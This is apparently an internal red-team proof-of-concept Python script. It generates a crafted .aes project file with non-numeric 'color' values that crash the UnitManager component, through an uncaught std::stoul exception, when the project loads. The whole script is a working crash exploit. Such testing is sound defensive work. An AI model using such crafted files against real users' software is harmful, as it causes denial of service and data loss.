#!/usr/bin/env python3
"""
Red Team PoC — SEC-RTM-003: UnitManager std::stoul Crash via Crafted .aes
Target: UnitManager.cpp:300  std::stoul(ju["color"].asString())
Impact: Crash on project load — no try/catch around stoul
Difficulty: Script Kiddie
"""
import json, sys, os

def build_malicious_aes():
    """Minimal .aes project with a unit containing a malformed color value."""
    return {
        "version": 1,
        "tempo": 120.0,
        "playhead": 0.0,
        "lanes": [
            {
                "name": "Channel 1",
                "color": "not_a_number",  # ← TRIGGER: std::stoul throws
                "volume": 1.0,
                "pan": 0.0,
                "automation": [],
                "clips": []
            }
        ],
        "sources": [],
        "patterns": [],
        "arsenal": {
            "units": [
                {
                    "id": 1,
                    "name": "Rumble",
                    "pluginId": "com.Aestrastudios.rumble",
                    "color": "not_a_number",  # ← TRIGGER: std::stoul(ju["color"])
                    "enabled": True,
                    "pluginStateHex": ""
                }
            ],
            "nextId": 2
        }
    }

def main():
    output = sys.argv[1] if len(sys.argv) > 1 else 'poc_stoul_crash.aes'
    project = build_malicious_aes()
    with open(output, 'w') as f:
        json.dump(project, f, indent=2)
    print(f"[+] PoC: {output} ({os.path.getsize(output)} bytes)")
    print(f"[+] UnitManager.cpp:300 → std::stoul(\"not_a_number\") → std::invalid_argument → crash")
    print(f"[+] Note: ProjectSerializer.cpp:628 has try/catch, but UnitManager.cpp:300 does NOT")

if __name__ == '__main__':
    main()
